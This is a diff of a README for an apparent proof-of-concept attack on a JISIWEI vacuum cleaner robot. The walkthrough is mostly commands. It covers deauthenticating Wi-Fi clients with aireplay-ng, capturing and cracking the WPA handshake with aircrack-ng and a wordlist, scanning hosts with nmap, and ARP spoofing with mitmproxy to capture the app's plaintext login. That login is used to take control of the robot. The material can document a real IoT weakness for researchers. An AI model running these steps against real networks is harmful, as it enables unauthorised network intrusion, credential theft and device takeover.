@@ -4,6 +4,7 @@
 A computer with these tools have to be fixed:
 - **Android Smartphone**, with the JISIWEI application installed. iOS app can be found here: https://apps.apple.com/us/app/极思维机器人/id937665306 and the APK file for the Android app is found in this repository.
 - **USB cable**, for connecting smarphone to PC
+- **scrcpy**, for showing the Android screen on the PC
 - **Aircrack-ng**, for cracking the wifi-password
 - **nmap**, used for finding devices in network
 - **arpspoof**, needed for transparant proxy
@@ -13,6 +14,8 @@ A computer with these tools have to be fixed:
 - **JISIWEI Vacuum Cleaner Robot**
 
 The computer **Dell OptiPlex 7070** should have everything installed. If you use the **TP-Link High-Gain 150Mbps** wireless adapter, you won't have to install any necessary drivers.
+
+The wired internet connection has to be turned off. The robot should be up and running and connected to the Wi-Fi. The Smartphone has to be connected to the same Wi-Fi and connected to the computer with the USB Cable. 
 
 ## Step 1
 Use Aircrack-ng with the wireless network adapter to crack the password to the router.
@@ -32,25 +35,30 @@ We can then check what networks are available in the area:
 ```bash
 airodump-ng wlan0
 ```
+![](screenshots/airodump.png)
 
 Take the BSSID and channel from the WIFI we will hack and do the following:
 ```bash
 airodump-ng -c [channel for wifi] --bssid [BSSID for wifi] -w psk wlan0
 ```
+![](screenshots/getting_packets.png)
+
 We will now wait on a WPA handshake, we could make this process faster by taking a BSSID of a host that is connected to the wifi.
-Easiest way to accomplish this is by having your smartphone connected to the wifi.
+Easiest way to accomplish this is by having your smartphone connected to the wifi and try to surf around on the internet and have airplay running:
 
 ```bash
 aireplay-ng -0 0 -a [BSSID of wifi] -c [BSSID of host] wlan0
 ```
+![](screenshots/aireplay.png)
+![](screenshots/handshake.png)
 
 When we have the handshake you can terminate the previous programs. 
-
 Now use aircrack-ng with a password list and get the password.
 
 ```bash
 aircrack-ng -w rockyou.txt -b [BSSID of wifi] psk*.cap
 ```
+![](screenshots/aircrack.png)
 
 Now you can set the mode for the wireless adapter to Auto and then login to the wifi. Either run the script auto_mode.sh or do the following:
 
@@ -62,17 +70,15 @@ ifconfig wlan0 up
 ```
 
 ## Step 2
-Login to the wifi.
-
-Use Nmap to see the devices in the network.
+Login to the wifi and then use Nmap to see the devices in the network.
 ```bash
-nmap -sn 192.168.1.127/24
+nmap -sn 192.168.1.0/24
 ```
-Check ports on all the devices found in the network. We will need the router and a phone.
+Check ports on all the devices found in the network. We will need the IP of the router and the phone.
 
 
 ## Step 3
-Either run the script **spoof.sh** or do all the steps down below.
+In order to make the following work, do the following, make sure that the computer isn't hooked up through wired internet connect and then either run the script **spoof.sh** or do all the steps down below.
 
 First we will setup port forwarding before using arpspoof and mitmproxy:
 
@@ -94,14 +100,14 @@ Start mitmproxy in transparent mode in the third terminal and wait till someone 
 ```bash
 mitmproxy --mode transparent --showhost
 ```
-
-Use the smartphone and log in to the JISIWEI application while on the same network.
-
-Use the credentials:
+![](screenshots/spoof.png)
+Use the smartphone and log in to the JISIWEI application while on the same network. Use the credentials:
 
 username: hackmanhacker8@gmail.com
 
 password: proofofconcept
+
+![](screenshots/mitmproxy.png)
 
 When you have logged in you can see the credentials in the HTTP request. Meaning that the attacker now has access to those credentials and is now able to login to the app and controll the vacuum cleaner robot.
 
@@ -109,7 +115,7 @@ When you have logged in you can see the credentials in the HTTP request. Meaning
 
 Login to the application using the smartphone showing that it is the same credentials and use the functions of the application.
 The attacker could then login whenever they pleases without being in the network.
-Using an android device you could display the screen of the phone on a the bigger screen. The "USB-Debug" has to be allowd, which can be found in the developer settings on the smarthphone. Use the following tool: 
+Using an android device you could display the screen of the phone on a the bigger screen. The "USB-Debug" has to be allowed, which can be found in the developer settings on the smarthphone. Use the following tool: 
 ```bash
-srcpcopy 
+scrcpy 
 ```
